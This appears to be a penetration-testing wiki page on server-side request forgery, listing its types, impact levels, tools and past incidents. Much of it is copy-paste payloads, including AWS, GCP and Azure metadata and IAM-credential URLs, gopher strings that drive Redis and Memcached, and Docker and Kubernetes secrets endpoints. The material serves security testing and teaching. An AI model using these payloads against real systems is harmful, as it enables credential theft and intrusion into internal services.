---
tags:
  - critical
  - server-side
---

# SSRF - Server-Side Request Forgery

## TL;DR

Manipulate server to make HTTP requests to attacker-controlled destinations or internal resources. Quick test: `http://169.254.169.254/latest/meta-data/` for AWS metadata.

```bash
# Basic payload
?url=http://127.0.0.1:8080/admin
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Types:**

- **Full Response** — Control URL, see response
- **Blind** — Request made but no response visible
- **Partial** — Control part of URL (path, params)

## Quick Links

- [Finding SSRF](find.md) — Where to look
- [Exploitation](exploit.md) — From request to impact
- [Bypasses](bypasses.md) — Filter and WAF evasion
- [Escalation](escalate.md) — Cloud metadata, internal services, RCE
- [Payloads](../../quick/ssrf.md) — Copy-paste ready

## Impact

| Scenario | Severity |
|----------|----------|
| Blind SSRF, no clear impact | Low |
| Read internal resources | Medium |
| Port scan internal network | Medium |
| Access cloud metadata | High |
| Retrieve IAM credentials | Critical |
| Internal service compromise | High-Critical |
| RCE via internal service | Critical |

## Quick Test

```bash
# Localhost variations
http://127.0.0.1
http://localhost
http://127.1
http://[::1]

# Cloud metadata
http://169.254.169.254/latest/meta-data/  # AWS
http://metadata.google.internal/           # GCP
http://169.254.169.254/metadata/instance   # Azure
http://100.100.100.200/                    # Alibaba (often bypasses filters!)

# Blind detection
http://YOUR-ID.oast.fun
```

## Protocol Handlers

| Protocol | Purpose |
|----------|---------|
| `http://` | Standard web requests |
| `file://` | Read local files |
| `gopher://` | Raw TCP (most powerful!) |
| `dict://` | Banner grabbing |
| `ftp://` | FTP connections |
| `ldap://` | LDAP queries |

## Internal Service Targets

```bash
# Redis (6379)
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a

# Memcached (11211)
gopher://127.0.0.1:11211/_stats%0A

# Elasticsearch (9200)
http://127.0.0.1:9200/_cat/indices

# Docker API (2375)
http://127.0.0.1:2375/containers/json

# Kubernetes
http://127.0.0.1:10250/pods
https://kubernetes.default.svc/api/v1/namespaces/default/secrets

# Common admin panels
http://127.0.0.1:8080/manager/html    # Tomcat
http://127.0.0.1:9090/                # Prometheus
http://127.0.0.1:8080/actuator/env    # Spring Boot
```

## Tools

| Tool | Purpose |
|------|---------|
| [SSRFmap](https://github.com/swisskyrepo/SSRFmap) | Automated SSRF exploitation |
| [Gopherus](https://github.com/tarunkant/Gopherus) | Gopher payload generator |
| [Interactsh](https://github.com/projectdiscovery/interactsh) | OOB callback server |
| [Interactsh Everywhere](https://portswigger.net) | Header injection detection |

## Real-World Examples

| Target | Technique | Impact |
|--------|-----------|--------|
| Capital One | SSRF in WAF → AWS metadata | 100M records breached |
| GitLab | DNS rebinding TOCTOU | AWS credentials |
| DuckDuckGo | Image proxy + metadata | Full AWS metadata |
| Slack | IPv6 [::] bypass | Internal port scan |
| Shopify | SVG xlink:href | Blind SSRF |
